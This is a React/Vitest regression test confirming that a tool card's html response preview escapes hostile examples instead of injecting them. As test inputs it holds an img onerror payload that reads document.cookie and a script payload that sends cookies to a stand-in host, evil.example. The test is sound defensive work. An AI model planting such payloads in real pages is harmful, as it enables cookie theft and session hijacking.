/**
 * @vitest-environment jsdom
 *
 * LC-078 regression: the `html` response-type branch of ResponsePreview
 * injected the tool's declared response example with dangerouslySetInnerHTML while the four
 * sibling branches (json / xml / csv / text) rendered it escaped in a <pre>. A tool definition
 * is authored data, so the example was an XSS sink for whoever expanded the card.
 *
 * Pre-fix, `<img src=x onerror=...>` was parsed into a real <img> element in the document (and
 * fired), and the raw markup was NOT present as text. Both assertions below fail on that code.
 */
import { describe, it, expect, vi, afterEach } from 'vitest';
import { render, screen, cleanup } from '@testing-library/react';
import * as React from 'react';

vi.mock('next-intl', () => ({
  useTranslations: () => (key: string) => key,
}));

import { ResponsePreview } from '../ToolCard';

const XSS_EXAMPLE = '<img src=x onerror="alert(document.cookie)">';

describe('ResponsePreview html branch (LC-078)', () => {
  afterEach(() => cleanup());

  it('renders an html response example as TEXT, never as markup', () => {
    const { container } = render(<ResponsePreview type="html" success={XSS_EXAMPLE} />);

    // No element was created from the example, and no handler attribute node exists.
    expect(container.querySelector('img')).toBeNull();
    expect(container.querySelector('[onerror]')).toBeNull();
    // The markup is present as ESCAPED text, not as parsed HTML.
    expect(container.innerHTML).toContain('&lt;img src=x onerror=');
    // The example is still visible to the developer.
    expect(screen.getByText(XSS_EXAMPLE)).toBeTruthy();
  });

  it('renders a <script> example as text without adding a script element', () => {
    const example = '<script>fetch("https://evil.example/?c="+document.cookie)</script>';
    const { container } = render(<ResponsePreview type="html" success={example} />);

    expect(container.querySelector('script')).toBeNull();
    expect(screen.getByText(example)).toBeTruthy();
  });

  it('stringifies a non-string html example instead of injecting it', () => {
    const { container } = render(<ResponsePreview type="html" success={{ body: '<b>x</b>' }} />);

    expect(container.querySelector('b')).toBeNull();
    expect(container.textContent).toContain('"body"');
  });

  it('keeps the sibling text branch escaped as before (no regression)', () => {
    const { container } = render(<ResponsePreview type="text" success={XSS_EXAMPLE} />);

    expect(container.querySelector('img')).toBeNull();
    expect(screen.getByText(XSS_EXAMPLE)).toBeTruthy();
  });
});
